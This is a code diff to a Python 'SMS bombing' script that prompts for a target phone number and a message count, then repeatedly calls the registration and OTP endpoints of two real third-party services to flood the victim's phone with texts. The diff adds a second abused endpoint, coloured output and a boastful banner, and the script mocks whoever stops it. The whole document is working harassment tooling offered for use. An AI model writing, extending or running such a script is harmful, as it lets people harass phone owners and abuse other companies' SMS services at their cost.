@@ -1,19 +1,17 @@
 import requests
 import time
 import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from colorama import Fore, Style  # Import colorama for colorful output
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Initialize message count
 message_count = 0
 
-def send_sms(phone_number, message):
+def send_sms(url, phone_number, message):
     global message_count  # Access the global message count variable
-    url = "https://ap.paymasterbd.net/login_registration/"
     headers = {
-        "Host": "ap.paymasterbd.net",
         "Content-Type": "application/x-www-form-urlencoded",
-        "Content-Length": "90",
         "Accept-Encoding": "gzip",
         "User-Agent": "okhttp/3.14.9",
     }
@@ -29,23 +27,17 @@ def send_sms(phone_number, message):
 
     if response.status_code == 200:
         message_count += 1  # Increment the message count
-        print("SMS sent to", phone_number)
+        print(Fore.GREEN + "SMS sent to", phone_number)
         print("Total messages sent:", message_count)  # Display message count
     else:
-        print("Failed to send SMS to", phone_number)
+        print(Fore.RED + "Failed to send SMS to", phone_number)
 
-phone_number = input("Enter the target phone number: ")
+phone_number = input(Fore.YELLOW + "Enter the target phone number: ")
 message = input("Enter the message to send: ")
 num_messages = int(input("Enter the number of messages to send: "))
 
-try:
-    for _ in range(num_messages):
-        send_sms(phone_number, message)
-        time.sleep(0.3)  # Adjust this value to send messages at the desired rate
-except KeyboardInterrupt:
-    print("SMS bombing interrupted. You coward!")
-#My wicked logo:
-print('''
+# Wicked logo to showcase your power:
+print(Fore.RED + '''
                                                                                                
                                                                                                
                AAA               RRRRRRRRRRRRRRRRR   XXXXXXX       XXXXXXXUUUUUUUU     UUUUUUUU
@@ -66,9 +58,15 @@ print('''
 AAAAAAA                   AAAAAAARRRRRRRR     RRRRRRRXXXXXXX       XXXXXXX      UUUUUUUUU      
                                                                                                
                                                                                                
-                                                                                               
-                                                                                               
-                                                                                               
-                                                                                               
-                                                                                               
 ''')
+
+# Reset color to default
+print(Style.RESET_ALL)
+
+try:
+    for _ in range(num_messages):
+        send_sms("https://ap.paymasterbd.net/login_registration/", phone_number, message)
+        send_sms("https://www.redbus.in/api/getOtp", phone_number, "")  # Sending blank message to redBus API
+        time.sleep(0.3)  # Adjust this value to send messages at the desired rate
+except KeyboardInterrupt:
+    print(Fore.YELLOW + "SMS bombing interrupted. You coward!")
